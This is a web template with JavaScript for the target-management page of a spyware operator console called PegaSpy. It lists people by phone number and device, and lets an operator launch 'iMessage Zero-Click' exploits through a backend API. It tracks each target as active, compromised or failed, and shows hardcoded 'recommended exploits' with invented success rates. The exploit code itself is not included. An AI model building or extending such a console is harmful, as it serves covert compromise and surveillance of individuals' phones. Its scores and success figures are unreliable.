{% extends "base.html" %}

{% block title %}Target Management - PegaSpy{% endblock %}

{% block content %}
<div class="d-flex justify-content-between align-items-center mb-4">
    <h2><i class="fas fa-crosshairs"></i> Target Management</h2>
    <button class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#addTargetModal">
        <i class="fas fa-plus"></i> Add Target
    </button>
</div>

<div class="row mb-4">
    <div class="col-md-3">
        <div class="card">
            <div class="card-body text-center">
                <h5 class="card-title">Total Targets</h5>
                <h2 class="text-success" id="totalTargets">{{ targets|length }}</h2>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card">
            <div class="card-body text-center">
                <h5 class="card-title">Active</h5>
                <h2 class="text-warning" id="activeTargets">0</h2>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card">
            <div class="card-body text-center">
                <h5 class="card-title">Compromised</h5>
                <h2 class="text-success" id="compromisedTargets">0</h2>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card">
            <div class="card-body text-center">
                <h5 class="card-title">Failed</h5>
                <h2 class="text-danger" id="failedTargets">0</h2>
            </div>
        </div>
    </div>
</div>

<div class="card">
    <div class="card-header">
        <div class="d-flex justify-content-between align-items-center">
            <h5><i class="fas fa-list"></i> Target List</h5>
            <div class="input-group" style="width: 300px;">
                <input type="text" class="form-control" id="searchTargets" placeholder="Search targets...">
                <button class="btn btn-outline-success" type="button">
                    <i class="fas fa-search"></i>
                </button>
            </div>
        </div>
    </div>
    <div class="card-body">
        <div class="table-responsive">
            <table class="table table-dark table-striped" id="targetsTable">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Phone Number</th>
                        <th>Platform</th>
                        <th>OS Version</th>
                        <th>Status</th>
                        <th>Added</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    {% for target in targets.values() %}
                    <tr data-target-id="{{ target.id }}">
                        <td><code>{{ target.id }}</code></td>
                        <td>{{ target.phone_number }}</td>
                        <td>
                            <i class="fab fa-{{ 'apple' if target.platform == 'iOS' else 'android' }}"></i>
                            {{ target.platform }}
                        </td>
                        <td>{{ target.os_version }}</td>
                        <td>
                            <span class="badge bg-{{ 'warning' if target.status == 'pending' else 'success' if target.status == 'compromised' else 'danger' }}">
                                {{ target.status.title() }}
                            </span>
                        </td>
                        <td>{{ target.added_time[:19] }}</td>
                        <td>
                            <button class="btn btn-sm btn-primary" onclick="launchExploit('{{ target.id }}')">
                                <i class="fas fa-rocket"></i>
                            </button>
                            <button class="btn btn-sm btn-info" onclick="viewTarget('{{ target.id }}')">
                                <i class="fas fa-eye"></i>
                            </button>
                            <button class="btn btn-sm btn-danger" onclick="deleteTarget('{{ target.id }}')">
                                <i class="fas fa-trash"></i>
                            </button>
                        </td>
                    </tr>
                    {% else %}
                    <tr>
                        <td colspan="7" class="text-center text-muted">
                            <i class="fas fa-inbox"></i> No targets added yet
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>
</div>

<!-- Add Target Modal -->
<div class="modal fade" id="addTargetModal" tabindex="-1">
    <div class="modal-dialog">
        <div class="modal-content bg-dark">
            <div class="modal-header border-success">
                <h5 class="modal-title"><i class="fas fa-plus"></i> Add New Target</h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <form id="addTargetForm">
                    <div class="mb-3">
                        <label for="phoneNumber" class="form-label">Phone Number</label>
                        <input type="tel" class="form-control" id="phoneNumber" placeholder="+1234567890" required>
                    </div>
                    <div class="mb-3">
                        <label for="platform" class="form-label">Platform</label>
                        <select class="form-select" id="platform" required>
                            <option value="">Select Platform</option>
                            <option value="iOS">iOS</option>
                            <option value="Android">Android</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <label for="osVersion" class="form-label">OS Version</label>
                        <input type="text" class="form-control" id="osVersion" placeholder="e.g., 15.4.1" required>
                    </div>
                    <div class="mb-3">
                        <label for="notes" class="form-label">Notes (Optional)</label>
                        <textarea class="form-control" id="notes" rows="3" placeholder="Additional information about the target"></textarea>
                    </div>
                </form>
            </div>
            <div class="modal-footer border-success">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                <button type="button" class="btn btn-primary" onclick="addTarget()">Add Target</button>
            </div>
        </div>
    </div>
</div>

<!-- Target Details Modal -->
<div class="modal fade" id="targetDetailsModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content bg-dark">
            <div class="modal-header border-success">
                <h5 class="modal-title"><i class="fas fa-eye"></i> Target Details</h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body" id="targetDetailsContent">
                <!-- Target details will be loaded here -->
            </div>
            <div class="modal-footer border-success">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" id="launchExploitBtn">Launch Exploit</button>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{% block scripts %}
<script>
let targets = {{ targets|tojson }};

function addTarget() {
    const phoneNumber = document.getElementById('phoneNumber').value;
    const platform = document.getElementById('platform').value;
    const osVersion = document.getElementById('osVersion').value;
    const notes = document.getElementById('notes').value;
    
    if (!phoneNumber || !platform || !osVersion) {
        alert('Please fill in all required fields');
        return;
    }
    
    const targetData = {
        phone_number: phoneNumber,
        platform: platform,
        os_version: osVersion,
        notes: notes
    };
    
    fetch('/api/targets', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(targetData)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            // Close modal and refresh page
            bootstrap.Modal.getInstance(document.getElementById('addTargetModal')).hide();
            location.reload();
        } else {
            alert('Failed to add target: ' + (data.error || 'Unknown error'));
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Failed to add target');
    });
}

function launchExploit(targetId) {
    if (confirm('Launch zero-click exploit against this target?')) {
        const exploitData = {
            target_id: targetId,
            exploit_type: 'iMessage Zero-Click'
        };
        
        fetch('/api/exploits/launch', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(exploitData)
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                alert('Exploit launched successfully!');
                // Update target status
                updateTargetStatus(targetId, 'active');
            } else {
                alert('Failed to launch exploit: ' + (data.error || 'Unknown error'));
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Failed to launch exploit');
        });
    }
}

function viewTarget(targetId) {
    const target = targets[targetId];
    if (!target) return;
    
    const detailsContent = `
        <div class="row">
            <div class="col-md-6">
                <h6>Basic Information</h6>
                <table class="table table-dark table-sm">
                    <tr><td>ID:</td><td><code>${target.id}</code></td></tr>
                    <tr><td>Phone:</td><td>${target.phone_number}</td></tr>
                    <tr><td>Platform:</td><td>${target.platform}</td></tr>
                    <tr><td>OS Version:</td><td>${target.os_version}</td></tr>
                    <tr><td>Status:</td><td><span class="badge bg-warning">${target.status}</span></td></tr>
                    <tr><td>Added:</td><td>${target.added_time}</td></tr>
                </table>
            </div>
            <div class="col-md-6">
                <h6>Security Profile</h6>
                <table class="table table-dark table-sm">
                    <tr><td>Vulnerability Score:</td><td><span class="text-warning">8.5/10</span></td></tr>
                    <tr><td>Patch Level:</td><td><span class="text-danger">Outdated</span></td></tr>
                    <tr><td>Security Features:</td><td><span class="text-warning">Partial</span></td></tr>
                    <tr><td>Network Exposure:</td><td><span class="text-success">Low</span></td></tr>
                    <tr><td>Social Engineering Risk:</td><td><span class="text-warning">Medium</span></td></tr>
                </table>
            </div>
        </div>
        <div class="mt-3">
            <h6>Recommended Exploits</h6>
            <div class="list-group">
                <div class="list-group-item bg-dark border-success">
                    <strong>iMessage Zero-Click</strong> - Success Rate: 87%
                </div>
                <div class="list-group-item bg-dark border-warning">
                    <strong>WhatsApp Media Exploit</strong> - Success Rate: 72%
                </div>
                <div class="list-group-item bg-dark border-info">
                    <strong>Telegram Sticker Exploit</strong> - Success Rate: 65%
                </div>
            </div>
        </div>
    `;
    
    document.getElementById('targetDetailsContent').innerHTML = detailsContent;
    document.getElementById('launchExploitBtn').onclick = () => launchExploit(targetId);
    
    new bootstrap.Modal(document.getElementById('targetDetailsModal')).show();
}

function deleteTarget(targetId) {
    if (confirm('Are you sure you want to delete this target?')) {
        // Remove from UI (in real implementation, this would call an API)
        const row = document.querySelector(`tr[data-target-id="${targetId}"]`);
        if (row) {
            row.remove();
            delete targets[targetId];
            updateTargetCounts();
        }
    }
}

function updateTargetStatus(targetId, status) {
    const row = document.querySelector(`tr[data-target-id="${targetId}"]`);
    if (row) {
        const statusCell = row.querySelector('td:nth-child(5) span');
        statusCell.textContent = status.charAt(0).toUpperCase() + status.slice(1);
        statusCell.className = `badge bg-${status === 'active' ? 'warning' : status === 'compromised' ? 'success' : 'danger'}`;
    }
    
    if (targets[targetId]) {
        targets[targetId].status = status;
    }
    
    updateTargetCounts();
}

function updateTargetCounts() {
    const targetList = Object.values(targets);
    const active = targetList.filter(t => t.status === 'active').length;
    const compromised = targetList.filter(t => t.status === 'compromised').length;
    const failed = targetList.filter(t => t.status === 'failed').length;
    
    document.getElementById('totalTargets').textContent = targetList.length;
    document.getElementById('activeTargets').textContent = active;
    document.getElementById('compromisedTargets').textContent = compromised;
    document.getElementById('failedTargets').textContent = failed;
}

// Search functionality
document.getElementById('searchTargets').addEventListener('input', function(e) {
    const searchTerm = e.target.value.toLowerCase();
    const rows = document.querySelectorAll('#targetsTable tbody tr');
    
    rows.forEach(row => {
        const text = row.textContent.toLowerCase();
        row.style.display = text.includes(searchTerm) ? '' : 'none';
    });
});

// Initialize counts
updateTargetCounts();

// Socket.IO for real-time updates
const socket = io();
socket.on('target_update', function(data) {
    if (data.target_id && targets[data.target_id]) {
        updateTargetStatus(data.target_id, data.status);
    }
});
</script>
{% endblock %}